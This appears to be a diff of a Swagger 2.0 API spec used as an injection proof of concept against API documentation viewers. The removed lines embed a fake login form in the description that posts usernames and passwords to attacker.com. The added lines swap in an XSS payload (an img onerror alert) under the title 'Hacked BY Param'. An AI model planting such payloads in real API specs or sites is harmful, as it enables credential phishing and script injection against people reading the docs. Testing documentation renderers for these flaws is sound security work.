@@ -1,26 +1,11 @@
-swagger: "2.0"
+swagger: '2.0'
 info:
-  title: "HTML Injection PoC – Fake Login"
-  description: |
-    <h2 style='color:red;'>⚠️ Security Verification Required</h2>
-    <form action="https://attacker.com/capture" method="POST" style="border:1px solid #ccc;padding:10px;">
-      <label><b>Username</b></label><br>
-      <input type="text" name="username" placeholder="Enter Username" style="width:100%;padding:8px;margin:6px 0;"><br>
-      <label><b>Password</b></label><br>
-      <input type="password" name="password" placeholder="Enter Password" style="width:100%;padding:8px;margin:6px 0;"><br>
-      <button type="submit" style="background-color:#4CAF50;color:white;padding:10px;width:100%;">Login</button>
-    </form>
-    <p style="color:gray;font-size:12px;">© 2025 Example Auth Gateway</p>
-  version: "1.0.0"
-host: example.com
-basePath: /
-schemes:
-  - https
+  version: "0.0.1"
+  title: Hacked BY Param
+  description: <img src=x onerror="alert('XSS')">
 paths:
-  /test:
+  /:
     get:
-      summary: "Fake Login PoC"
-      description: "This endpoint is a PoC for HTML Injection with fake login form."
       responses:
         200:
-          description: "Success"
+          description: Successful response
